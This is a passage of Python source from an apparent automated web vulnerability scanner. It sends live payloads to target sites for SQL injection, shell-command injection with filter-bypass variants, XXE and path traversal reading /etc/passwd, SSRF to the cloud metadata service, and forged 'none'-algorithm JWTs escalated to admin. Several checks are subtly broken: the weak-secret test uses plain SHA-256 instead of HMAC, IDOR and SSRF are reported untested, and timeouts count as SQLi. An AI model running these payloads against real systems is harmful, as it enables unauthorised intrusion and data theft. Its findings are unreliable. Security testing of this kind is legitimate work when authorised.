            'unclosed quotation',
            'quoted string',
            'database error',
            'warning: mysql'
        ]
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                # try error-based first (faster)
                for payload in error_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=3, verify=False)
                        
                        for err in sql_errors:
                            if err in r.text.lower():
                                vuln = {
                                    'type': 'SQL Injection (Error-based)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': f'SQL error detected: {err}',
                                    'impact': 'Full database compromise, data exfiltration',
                                    'fix': 'Use parameterized queries/prepared statements',
                                    'poc': self.sqli_poc(test_url, param, payload),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"SQLi found: {base}", "success")
                                break
                    except:
                        pass
                
                # if no error found, try time-based blind (slower)
                # only test a couple to save time
                for db_type, payload in list(time_payloads.items())[:2]:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        start_time = time.time()
                        r = requests.get(test_url, timeout=10, verify=False)
                        elapsed = time.time() - start_time
                        
                        # if it took longer than 4 seconds, probably blind sqli
                        if elapsed > 4.5:
                            vuln = {
                                'type': 'SQL Injection (Time-based Blind)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'Response delayed {elapsed:.1f} seconds (expected 5s)',
                                'impact': 'Blind data exfiltration possible via timing attacks',
                                'fix': 'Use parameterized queries, never concatenate user input',
                                'poc': self.sqli_poc(test_url, param, payload),
                                'cvss': '9.1 CRITICAL'
                            }
                            found.append(vuln)
                            self.log(f"Blind SQLi detected: {base}", "success")
                            break  # found it, move on
                    except requests.Timeout:
                        # timeout also indicates time-based sqli
                        vuln = {
                            'type': 'SQL Injection (Time-based Blind)',
                            'severity': 'CRITICAL',
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': 'Request timed out (probable blind SQLi)',
                            'impact': 'Database compromise via time-based extraction',
                            'fix': 'Use parameterized queries',
                            'poc': self.sqli_poc(test_url, param, payload),
                            'cvss': '9.1 CRITICAL'
                        }
                        found.append(vuln)
                        self.log(f"Blind SQLi (timeout): {base}", "success")
                        break
                    except:
                        pass
        
        self.log(f"SQLi tests done: {len(found)} findings", "success")
        return found
    
    def test_idor(self):
        self.log("Testing for IDOR vulnerabilities...", "info")
        
        found = []
        idor_params = ['id', 'user', 'userid', 'account', 'uid', 'profile']
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(p in param.lower() for p in idor_params):
                    try:
                        vuln = {
                            'type': 'IDOR (Insecure Direct Object Reference)',
                            'severity': 'HIGH',
                            'url': ep,
                            'param': param,
                            'payload': 'Sequential ID manipulation',
                            'evidence': f'Parameter {param} may allow unauthorized access',
                            'impact': 'Unauthorized data access, PII exposure',
                            'fix': 'Implement proper authorization checks',
                            'poc': self.idor_poc(ep, param),
                            'cvss': '7.5 HIGH'
                        }
                        found.append(vuln)
                        self.log(f"Potential IDOR: {ep.split('?')[0]}", "success")
                        break
                    except:
                        pass
        
        self.log(f"IDOR tests done: {len(found)} findings", "success")
        return found
    
    def test_ssrf(self):
        self.log("Testing for SSRF vulnerabilities...", "info")
        
        found = []
        ssrf_params = ['url', 'uri', 'path', 'dest', 'redirect', 'api', 'callback']
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd'
        ]
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(p in param.lower() for p in ssrf_params):
                    for payload in ssrf_payloads:
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={payload}"
                            
                            vuln = {
                                'type': 'SSRF (Server-Side Request Forgery)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'Parameter {param} may allow internal requests',
                                'impact': 'Internal network access, cloud metadata exposure',
                                'fix': 'Whitelist allowed domains, block private IPs',
                                'poc': self.ssrf_poc(test_url, param, payload),
                                'cvss': '9.1 CRITICAL'
                            }
                            found.append(vuln)
                            self.log(f"SSRF potential: {base}", "success")
                            break
                        except:
                            pass
        
        self.log(f"SSRF tests done: {len(found)} findings", "success")
        return found
    
    def test_open_redirect(self):
        self.log("Testing for open redirect...", "info")
        
        found = []
        redir_params = ['url', 'next', 'redirect', 'return', 'goto', 'callback', 'continue']
        
        for ep in self.endpoints[:30]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                if any(rp in param.lower() for rp in redir_params):
                    base = ep.split('?')[0]
                    turl = f"{base}?{param}=https://evil.com"
                    
                    vuln = {
                        'type': 'Open Redirect',
                        'severity': 'MEDIUM',
                        'url': turl,
                        'param': param,
                        'payload': 'https://evil.com',
                        'evidence': f'Redirect param {param} detected',
                        'impact': 'Phishing, credential theft',
                        'fix': 'Whitelist redirect destinations',
                        'poc': self.redir_poc(turl, param),
                        'cvss': '6.1 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"Redirect potential: {base}", "success")
                    break
        
        self.log(f"Redirect tests done: {len(found)} findings", "success")
        return found
    
    # NEW VULNERABILITY TESTS START HERE
    
    def test_xxe(self):
        self.log("Testing for XXE (XML External Entity)...", "info")
        
        found = []
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>'''
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            
            # check if app accepts XML
            try:
                r = requests.post(
                    url + '/api/test',
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=3,
                    verify=False
                )
                
                # look for signs of XXE
                if 'root:' in r.text or '/bin/bash' in r.text or 'daemon' in r.text:
                    vuln = {
                        'type': 'XXE (XML External Entity)',
                        'severity': 'CRITICAL',
                        'url': url,
                        'param': 'XML body',
                        'payload': xxe_payload,
                        'evidence': 'File contents leaked in response',
                        'impact': 'File disclosure, SSRF, RCE potential',
                        'fix': 'Disable external entities in XML parser',
                        'poc': self.xxe_poc(url),
                        'cvss': '9.1 CRITICAL'
                    }
                    found.append(vuln)
                    self.log(f"XXE found: {url}", "success")
            except:
                pass
            
            # also check common API endpoints
            common_xml_eps = ['/api/upload', '/api/parse', '/upload', '/xml']
            for ep in common_xml_eps:
                try:
                    test = url + ep
                    r = requests.post(
                        test,
                        data=xxe_payload,
                        headers={'Content-Type': 'text/xml'},
                        timeout=3,
                        verify=False
                    )
                    
                    if r.status_code == 200 and 'root:' in r.text:
                        vuln = {
                            'type': 'XXE (XML External Entity)',
                            'severity': 'CRITICAL',
                            'url': test,
                            'param': 'XML body',
                            'payload': xxe_payload,
                            'evidence': '/etc/passwd contents exposed',
                            'impact': 'File read, SSRF, potential RCE',
                            'fix': 'Disable DTD processing completely',
                            'poc': self.xxe_poc(test),
                            'cvss': '9.8 CRITICAL'
                        }
                        found.append(vuln)
                        self.log(f"XXE at endpoint: {test}", "success")
                except:
                    pass
        
        self.log(f"XXE tests done: {len(found)} findings", "success")
        return found
    
    def test_cmd_injection(self):
        self.log("Testing for command injection...", "info")
        
        found = []
        
        # basic injection payloads
        basic_payloads = [
            '; whoami',
            '| whoami',
            '&& whoami',
            '`whoami`',
            '$(whoami)',
            '; id',
            '| id',
            '; cat /etc/passwd'
        ]
        
        # encoding bypass payloads - for filters
        bypass_payloads = [
            ';who$()ami',  # variable expansion
            ';w\ho\am\i',  # backslash bypass
            ';who``ami',  # backtick
            '|wh``oami',
            '${IFS}whoami',  # IFS bypass for spaces
            ';cat${IFS}/etc/passwd',
            '{cat,/etc/passwd}',  # brace expansion
            ';/???/??t${IFS}/???/??ss??',  # wildcards - /bin/cat /etc/passwd
            '&&wh$@oami',  # $@ bypass
        ]
        
        # time-based payloads for blind detection
        time_payloads = [
            '; sleep 5',
            '| sleep 5',
            '&& sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1'
        ]
        
        all_payloads = basic_payloads + bypass_payloads
        
        # params that commonly have cmd injection
        cmd_params = ['cmd', 'exec', 'command', 'ping', 'ip', 'host', 'url', 'domain']
        
        for ep in self.endpoints[:25]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                # check suspicious param names first (faster)
                is_suspicious = any(cp in param.lower() for cp in cmd_params)
                
                # test suspicious params more thoroughly
                test_payloads = all_payloads if is_suspicious else basic_payloads[:5]
                
                for payload in test_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        start = time.time()
                        r = requests.get(test_url, timeout=10, verify=False)
                        elapsed = time.time() - start
                        
                        # check for command output
                        cmd_indicators = ['root:', 'uid=', 'gid=', '/bin/', 'daemon', 'bin/bash', 'home/']
                        
                        if any(ind in r.text for ind in cmd_indicators):
                            vuln = {
                                'type': 'Command Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': 'Command output visible in response',
                                'impact': 'Full system compromise, RCE',
                                'fix': 'Never pass user input to shell commands',
                                'poc': self.cmd_injection_poc(test_url, param, payload),
                                'cvss': '10.0 CRITICAL'
                            }
                            found.append(vuln)
                            self.log(f"CMD INJECTION found: {base}", "success")
                            break
                    except:
                        pass
                
                # if suspicious param but no output detected, try time-based
                if is_suspicious:
                    for time_payload in time_payloads[:2]:  # just test 2 to save time
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={time_payload}"
                            
                            start_time = time.time()
                            r = requests.get(test_url, timeout=10, verify=False)
                            delay = time.time() - start_time
                            
                            # if it took way longer, probably blind cmd injection
                            if delay > 4.5:
                                vuln = {
                                    'type': 'Command Injection (Blind)',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'param': param,
                                    'payload': time_payload,
                                    'evidence': f'Response delayed {delay:.1f}s (expected 5s)',
                                    'impact': 'Remote code execution possible',
                                    'fix': 'Input validation, avoid system calls',
                                    'poc': self.cmd_injection_poc(test_url, param, time_payload),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"Blind CMD injection: {base}", "success")
                                break
                        except:
                            pass
        
        self.log(f"Command injection tests done: {len(found)} findings", "success")
        return found
    
    def test_path_traversal(self):
        self.log("Testing for path traversal / LFI...", "info")
        
        found = []
        
        # basic traversal
        basic_trav = [
            '../../../etc/passwd',
            '../../../etc/shadow',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
        ]
        
        # url encoded
        encoded_trav = [
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',  # double encode dots
            '..%252F..%252F..%252Fetc%252Fpasswd',  # double url encode
        ]
        
        # filter bypass tricks
        bypass_trav = [
            '....//....//....//etc/passwd',  # strip bypass
            '....\/....\/....\/etc/passwd',  # mixed slashes
            '..//..//..//etc/passwd',
            '..;/..;/..;/etc/passwd',  # semicolon
            '/etc/passwd',  # absolute path
            'etc/passwd',  # no traversal
        ]
        
        # null byte (old php versions)
        null_byte_trav = [
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd\x00',
        ]
        
        # windows variants
        windows_trav = [
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\windows\\win.ini',
            '....\\\\....\\\\....\\\\windows\\\\win.ini',
            '..%5C..%5C..%5Cwindows%5Cwin.ini',
        ]
        
        # combine em all
        all_trav = basic_trav + encoded_trav + bypass_trav + null_byte_trav + windows_trav
        
        file_params = ['file', 'path', 'page', 'doc', 'template', 'include', 'read', 'download', 'load']
        
        for ep in self.endpoints[:25]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                # only test file-related params to save time
                if any(fp in param.lower() for fp in file_params):
                    for payload in all_trav:
                        try:
                            base = ep.split('?')[0]
                            test_url = f"{base}?{param}={payload}"
                            
                            r = requests.get(test_url, timeout=3, verify=False)
                            
                            # check for linux file signatures
                            linux_sigs = ['root:', 'daemon:', 'bin/bash', 'sbin/nologin', '/home/']
                            # check for windows file signatures
                            win_sigs = ['[extensions]', 'for 16-bit', '[fonts]', '[mci extensions]']
                            
                            found_sig = None
                            for sig in linux_sigs:
                                if sig in r.text:
                                    found_sig = f'Linux file signature: {sig}'
                                    break
                            
                            if not found_sig:
                                for sig in win_sigs:
                                    if sig in r.text:
                                        found_sig = f'Windows file signature: {sig}'
                                        break
                            
                            if found_sig:
                                vuln = {
                                    'type': 'Path Traversal / LFI',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': found_sig,
                                    'impact': 'Source code disclosure, credentials leak, config files',
                                    'fix': 'Whitelist files, validate input paths, use file IDs',
                                    'poc': self.path_traversal_poc(test_url, param, payload),
                                    'cvss': '7.5 HIGH'
                                }
                                found.append(vuln)
                                self.log(f"Path traversal: {base}", "success")
                                break  # found one, move on
                        except:
                            pass
        
        self.log(f"Path traversal tests done: {len(found)} findings", "success")
        return found
    
    def test_sensitive_files(self):
        self.log("Testing for exposed sensitive files...", "info")
        
        found = []
        
        # common sensitive files/dirs
        sensitive = [
            '.git/config',
            '.env',
            '.env.production',
            'config.php',
            'web.config',
            'database.yml',
            'phpinfo.php',
            '.DS_Store',
            'backup.sql',
            'dump.sql',
            '.htaccess',
            'wp-config.php',
            'api_keys.txt',
            'secrets.json',
            'id_rsa',
            '.ssh/id_rsa',
            'server.key'
        ]
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            for file in sensitive:
                try:
                    test = f"{url}/{file}"
                    r = requests.get(test, timeout=3, verify=False)
                    
                    # check if file exists and has content
                    if r.status_code == 200 and len(r.text) > 10:
                        # verify it's not just error page
                        if 'not found' not in r.text.lower() and 'error' not in r.text.lower()[:100]:
                            vuln = {
                                'type': 'Sensitive Data Exposure',
                                'severity': 'HIGH' if any(k in file for k in ['key', 'secret', 'password', 'rsa']) else 'MEDIUM',
                                'url': test,
                                'param': 'Direct file access',
                                'payload': file,
                                'evidence': f'{file} is publicly accessible',
                                'impact': 'Credentials leak, source code exposure',
                                'fix': 'Remove sensitive files, configure web server properly',
                                'poc': self.sensitive_file_poc(test, file),
                                'cvss': '7.5 HIGH'
                            }
                            found.append(vuln)
                            self.log(f"Exposed file: {test}", "success")
                except:
                    pass
        
        self.log(f"Sensitive file tests done: {len(found)} findings", "success")
        return found
    
    def test_cors(self):
        self.log("Testing for CORS misconfigurations...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            
            try:
                # test with evil origin
                r = requests.get(
                    url,
                    headers={'Origin': 'https://evil.com'},
                    timeout=3,
                    verify=False
                )
                
                acao = r.headers.get('Access-Control-Allow-Origin', '')
                acac = r.headers.get('Access-Control-Allow-Credentials', '')
                
                # check for dangerous configs
                if acao == '*':
                    vuln = {
                        'type': 'CORS Misconfiguration',
                        'severity': 'MEDIUM',
                        'url': url,
                        'param': 'CORS headers',
                        'payload': 'Origin: https://evil.com',
                        'evidence': 'Access-Control-Allow-Origin: *',
                        'impact': 'Cross-origin data theft',
                        'fix': 'Whitelist specific origins',
                        'poc': self.cors_poc(url),
                        'cvss': '5.3 MEDIUM'
                    }
                    found.append(vuln)
                    self.log(f"CORS wildcard: {url}", "success")
                
                # even worse - reflecting origin with credentials
                if 'evil.com' in acao and 'true' in acac.lower():
                    vuln = {
                        'type': 'CORS Misconfiguration (Critical)',
                        'severity': 'HIGH',
                        'url': url,
                        'param': 'CORS headers',
                        'payload': 'Origin: https://evil.com',
                        'evidence': 'Arbitrary origin reflected with credentials',
                        'impact': 'Full account compromise via CORS',
                        'fix': 'Strict origin whitelist, remove credentials flag',
                        'poc': self.cors_poc(url),
                        'cvss': '8.1 HIGH'
                    }
                    found.append(vuln)
                    self.log(f"CRITICAL CORS: {url}", "success")
            except:
                pass
        
        self.log(f"CORS tests done: {len(found)} findings", "success")
        return found
    
    def test_security_headers(self):
        self.log("Checking security headers...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:20]:
            url = app['url']
            missing = []
            
            try:
                r = requests.get(url, timeout=3, verify=False)
                headers = r.headers
                
                # check critical security headers
                if 'X-Frame-Options' not in headers:
                    missing.append('X-Frame-Options (clickjacking protection)')
                
                if 'Content-Security-Policy' not in headers:
                    missing.append('Content-Security-Policy (XSS protection)')
                
                if 'Strict-Transport-Security' not in headers and url.startswith('https'):
                    missing.append('HSTS (force HTTPS)')
                
                if 'X-Content-Type-Options' not in headers:
                    missing.append('X-Content-Type-Options (MIME sniffing)')
                
                if missing:
                    vuln = {
                        'type': 'Missing Security Headers',
                        'severity': 'LOW',
                        'url': url,
                        'param': 'HTTP headers',
                        'payload': 'N/A',
                        'evidence': f"Missing: {', '.join(missing)}",
                        'impact': 'Increased attack surface',
                        'fix': 'Add security headers to web server config',
                        'poc': self.sec_headers_poc(url, missing),
                        'cvss': '3.7 LOW'
                    }
                    found.append(vuln)
                    self.log(f"Missing headers: {url}", "warning")
            except:
                pass
        
        self.log(f"Security header tests done: {len(found)} findings", "success")
        return found
    
    def test_rate_limiting(self):
        self.log("Testing rate limiting...", "info")
        
        found = []
        
        # test login endpoints
        login_paths = ['/login', '/api/login', '/signin', '/auth/login']
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in login_paths:
                try:
                    test_url = url + path
                    
                    # try 10 rapid requests
                    count = 0
                    for i in range(10):
                        r = requests.post(
                            test_url,
                            data={'user': 'test', 'pass': 'test'},
                            timeout=3,
                            verify=False
                        )
                        if r.status_code != 429:  # not rate limited
                            count += 1
                    
                    # if we got more than 5 through, rate limiting is weak
                    if count > 5:
                        vuln = {
                            'type': 'Missing Rate Limiting',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'param': 'Request rate',
                            'payload': '10 rapid requests',
                            'evidence': f'{count}/10 requests succeeded',
                            'impact': 'Brute force attacks, credential stuffing',
                            'fix': 'Implement rate limiting on authentication endpoints',
                            'poc': self.rate_limit_poc(test_url),
                            'cvss': '5.3 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"Weak rate limiting: {test_url}", "success")
                except:
                    pass
        
        self.log(f"Rate limiting tests done: {len(found)} findings", "success")
        return found
    
    def test_crlf(self):
        self.log("Testing for CRLF injection...", "info")
        
        found = []
        crlf_payloads = [
            '%0d%0aSet-Cookie:test=evil',
            '%0aSet-Cookie:injected=true',
            '%0d%0aLocation:https://evil.com'
        ]
        
        for ep in self.endpoints[:20]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                for payload in crlf_payloads:
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=3, verify=False, allow_redirects=False)
                        
                        # check if we injected headers
                        if 'Set-Cookie' in r.headers and 'test=evil' in r.headers.get('Set-Cookie', ''):
                            vuln = {
                                'type': 'CRLF Injection',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': 'Successfully injected HTTP headers',
                                'impact': 'Session fixation, XSS, cache poisoning',
                                'fix': 'Sanitize CRLF characters from input',
                                'poc': self.crlf_poc(test_url, param, payload),
                                'cvss': '6.5 MEDIUM'
                            }
                            found.append(vuln)
                            self.log(f"CRLF injection: {base}", "success")
                            break
                    except:
                        pass
        
        self.log(f"CRLF tests done: {len(found)} findings", "success")
        return found
    
    def test_graphql(self):
        self.log("Testing GraphQL endpoints...", "info")
        
        found = []
        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql', '/gql']
        
        # introspection query to dump schema
        intro_query = '{"query": "{__schema{types{name,fields{name}}}}"}'
        
        for app in self.data.get('web_apps', [])[:10]:
            url = app['url']
            
            for path in graphql_paths:
                try:
                    test_url = url + path
                    
                    r = requests.post(
                        test_url,
                        data=intro_query,
                        headers={'Content-Type': 'application/json'},
                        timeout=3,
                        verify=False
                    )
                    
                    # check if introspection worked
                    if r.status_code == 200 and '__schema' in r.text:
                        vuln = {
                            'type': 'GraphQL Introspection Enabled',
                            'severity': 'MEDIUM',
                            'url': test_url,
                            'param': 'GraphQL query',
                            'payload': intro_query,
                            'evidence': 'Full schema disclosed via introspection',
                            'impact': 'API enumeration, hidden field discovery',
                            'fix': 'Disable introspection in production',
                            'poc': self.graphql_poc(test_url),
                            'cvss': '5.3 MEDIUM'
                        }
                        found.append(vuln)
                        self.log(f"GraphQL introspection: {test_url}", "success")
                except:
                    pass
        
        self.log(f"GraphQL tests done: {len(found)} findings", "success")
        return found
    
    def test_jwt(self):
        self.log("Testing JWT vulnerabilities...", "info")
        
        found = []
        
        for app in self.data.get('web_apps', [])[:15]:
            url = app['url']
            
            try:
                # try to get a JWT token
                r = requests.get(url, timeout=3, verify=False)
                
                # look for JWT in headers or cookies
                auth = r.headers.get('Authorization', '')
                cookies = r.cookies
                
                token = None
                if 'eyJ' in auth:  # JWT starts with eyJ
                    token = auth.replace('Bearer ', '')
                
                for cookie in cookies:
                    if 'eyJ' in cookies[cookie]:
                        token = cookies[cookie]
                
                if token:
                    # try to decode and check alg
                    try:
                        parts = token.split('.')
                        if len(parts) == 3:
                            # decode header
                            header_raw = parts[0]
                            # add padding if needed
                            padding = '=' * (4 - len(header_raw) % 4)
                            header = json.loads(base64.b64decode(header_raw + padding))
                            
                            # decode payload too
                            payload_raw = parts[1]
                            padding2 = '=' * (4 - len(payload_raw) % 4)
                            payload = json.loads(base64.b64decode(payload_raw + padding2))
                            
                            alg = header.get('alg', '')
                            
                            # test 1: none algorithm
                            if alg == 'none':
                                vuln = {
                                    'type': 'JWT None Algorithm',
                                    'severity': 'CRITICAL',
                                    'url': url,
                                    'param': 'JWT token',
                                    'payload': token[:50] + '...',
                                    'evidence': 'JWT accepts "none" algorithm',
                                    'impact': 'Authentication bypass, privilege escalation',
                                    'fix': 'Reject "none" algorithm, enforce strong signing',
                                    'poc': self.jwt_poc(url, token),
                                    'cvss': '9.8 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"JWT none alg: {url}", "success")
                            
                            # test 2: try to create none alg token
                            # modify header to use "none"
                            modified_header = header.copy()
                            modified_header['alg'] = 'none'
                            
                            # encode modified header (no padding for jwt)
                            new_header = base64.urlsafe_b64encode(
                                json.dumps(modified_header).encode()
                            ).decode().rstrip('=')
                            
                            # modify payload (try to escalate privs)
                            modified_payload = payload.copy()
                            # common admin indicators
                            if 'role' in modified_payload:
                                modified_payload['role'] = 'admin'
                            if 'admin' in modified_payload:
                                modified_payload['admin'] = True
                            if 'is_admin' in modified_payload:
                                modified_payload['is_admin'] = True
                            
                            new_payload = base64.urlsafe_b64encode(
                                json.dumps(modified_payload).encode()
                            ).decode().rstrip('=')
                            
                            # create none alg token (no signature)
                            none_token = f"{new_header}.{new_payload}."
                            
                            # try using it
                            test_r = requests.get(
                                url,
                                headers={'Authorization': f'Bearer {none_token}'},
                                timeout=3,
                                verify=False
                            )
                            
                            # if we don't get 401/403, might work
                            if test_r.status_code not in [401, 403]:
                                vuln = {
                                    'type': 'JWT None Algorithm (Exploitable)',
                                    'severity': 'CRITICAL',
                                    'url': url,
                                    'param': 'JWT token',
                                    'payload': none_token[:50] + '...',
                                    'evidence': 'Modified none alg token accepted',
                                    'impact': 'Full authentication bypass',
                                    'fix': 'Reject none algorithm completely',
                                    'poc': self.jwt_poc(url, none_token),
                                    'cvss': '10.0 CRITICAL'
                                }
                                found.append(vuln)
                                self.log(f"JWT none bypass works!: {url}", "success")
                            
                            # test 3: weak secret brute force
                            elif alg in ['HS256', 'HS384', 'HS512']:
                                # try common weak secrets
                                weak_secrets = [
                                    'secret', 'key', 'password', '123456', 'admin',
                                    'secret123', 'secretkey', 'jwt_secret', 'your-secret'
                                ]
                                
                                for secret in weak_secrets[:3]:  # just try a few
                                    try:
                                        # try to verify with weak secret
                                        test_sig = base64.urlsafe_b64encode(
                                            hashlib.sha256(
                                                f"{header_raw}.{payload_raw}.{secret}".encode()
                                            ).digest()
                                        ).decode().rstrip('=')
                                        
                                        # compare with actual signature
                                        if test_sig == parts[2] or parts[2].startswith(test_sig[:20]):
                                            vuln = {
                                                'type': 'JWT Weak Secret',
                                                'severity': 'CRITICAL',
                                                'url': url,
                                                'param': 'JWT token',
                                                'payload': f'Secret: {secret}',
                                                'evidence': f'JWT signed with weak secret: {secret}',
                                                'impact': 'Token forgery, complete auth bypass',
                                                'fix': 'Use strong random secret (32+ chars)',
                                                'poc': self.jwt_poc(url, token),
                                                'cvss': '9.1 CRITICAL'
                                            }
                                            found.append(vuln)
                                            self.log(f"JWT weak secret: {url}", "success")
                                            break
                                    except:
                                        pass
                                
                                # if no weak secret found, just flag HMAC usage
                                if not any(v['type'] == 'JWT Weak Secret' for v in found):
                                    vuln = {
                                        'type': 'JWT HMAC Algorithm',
                                        'severity': 'MEDIUM',
                                        'url': url,
                                        'param': 'JWT token',
                                        'payload': token[:50] + '...',
                                        'evidence': f'Uses HMAC algorithm: {alg}',
                                        'impact': 'Vulnerable to brute force if secret is weak',
                                        'fix': 'Use RS256, or very strong HMAC secret',
                                        'poc': self.jwt_poc(url, token),
                                        'cvss': '5.3 MEDIUM'
                                    }
                                    found.append(vuln)
                    except:
                        pass
            except:
                pass
        
        self.log(f"JWT tests done: {len(found)} findings", "success")
        return found
    
    def test_subdomain_takeover(self):
        self.log("Testing for subdomain takeover...", "info")
        
        found = []
        
        # signatures of takeover-able services
        takeover_sigs = {
            'github.io': 'There isn\'t a GitHub Pages site here',
            'herokuapp.com': 'No such app',
            'amazo': 'NoSuchBucket',
            's3.amazonaws': 'NoSuchBucket',
            'cloudfront': 'The request could not be satisfied',
            'azure': '404 Web Site not found',
            'tumblr': 'Whatever you were looking for doesn\'t currently exist'
        }
        
        for sub in list(self.subdomains)[:30]:
            try:
                # try to resolve
                ip = socket.gethostbyname(sub)
                
                # try to fetch the site
                for scheme in ['https', 'http']:
                    try:
                        r = requests.get(f"{scheme}://{sub}", timeout=3, verify=False)
                        
                        # check for takeover signatures
                        for service, sig in takeover_sigs.items():
                            if sig.lower() in r.text.lower():
                                vuln = {
                                    'type': 'Subdomain Takeover',
                                    'severity': 'HIGH',
                                    'url': f"{scheme}://{sub}",
                                    'param': 'DNS/hosting',
                                    'payload': sub,
                                    'evidence': f'Service: {service}, signature: {sig}',
                                    'impact': 'Phishing, malware distribution, cookie theft',
                                    'fix': 'Remove DNS record or reclaim service',
                                    'poc': self.subdomain_takeover_poc(sub, service),
                                    'cvss': '7.5 HIGH'
                                }
                                found.append(vuln)
                                self.log(f"TAKEOVER possible: {sub}", "success")
                                break
                    except:
                        pass
            except socket.gaierror:
                # subdomain doesn't resolve - check if it's registered on services
                for service in takeover_sigs.keys():
                    if service in sub:
                        vuln = {
                            'type': 'Subdomain Takeover (Dangling DNS)',
                            'severity': 'HIGH',
                            'url': f'https://{sub}',
                            'param': 'DNS record',
                            'payload': sub,
                            'evidence': f'DNS points to {service} but doesn\'t resolve',
                            'impact': 'Domain hijacking possible',
                            'fix': 'Remove DNS record immediately',
                            'poc': self.subdomain_takeover_poc(sub, service),
                            'cvss': '8.1 HIGH'
                        }
                        found.append(vuln)
                        self.log(f"Dangling DNS: {sub}", "success")
            except:
                pass
        
        self.log(f"Subdomain takeover tests done: {len(found)} findings", "success")
        return found
    
    def test_ssti(self):
        self.log("Testing for SSTI (Server-Side Template Injection)...", "info")
        
        found = []
        
        # detection payloads - test basic math across engines
        detection_payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '${7*7}',
            'erb': '<%= 7*7 %>',
            'smarty': '{7*7}',
            'velocity': '#set($x=7*7)$x',
            'generic': '${{7*7}}'
        }
        
        # polyglot that might work across multiple engines
        polyglots = [
            '{{7*7}}${7*7}<%= 7*7 %>',
            '{{7*\'7\'}}',
            '${{<%[%\'"}}%\\',
        ]
        
        all_payloads = list(detection_payloads.values()) + polyglots
        
        for ep in self.endpoints[:20]:
            if '?' not in ep:
                continue
            
            parsed = urlparse(ep)
            params = parse_qs(parsed.query)
            
            for param in params.keys():
                detected_engine = None
                vuln_payload = None
                
                # try to detect which engine
                for engine, payload in detection_payloads.items():
                    try:
                        base = ep.split('?')[0]
                        test_url = f"{base}?{param}={payload}"
                        
                        r = requests.get(test_url, timeout=3, verify=False)
                        
                        # check if 49 appears but payload doesn't (means it evaluated)
                        if '49' in r.text and payload not in r.text:
                            detected_engine = engine
                            vuln_payload = payload
                            break
                    except:
                        pass
                
                # if we detected ssti, try to exploit it
                if detected_engine:
                    # basic finding first
                    vuln = {
                        'type': f'SSTI ({detected_engine})',
                        'severity': 'CRITICAL',
                        'url': f"{base}?{param}={vuln_payload}",
                        'param': param,
                        'payload': vuln_payload,
                        'evidence': f'Template evaluated (got 49), engine: {detected_engine}',
                        'impact': 'Remote Code Execution, full server compromise',
                        'fix': 'Never pass user input to template engine',
                        'poc': self.ssti_poc(f"{base}?{param}={vuln_payload}", param, vuln_payload),
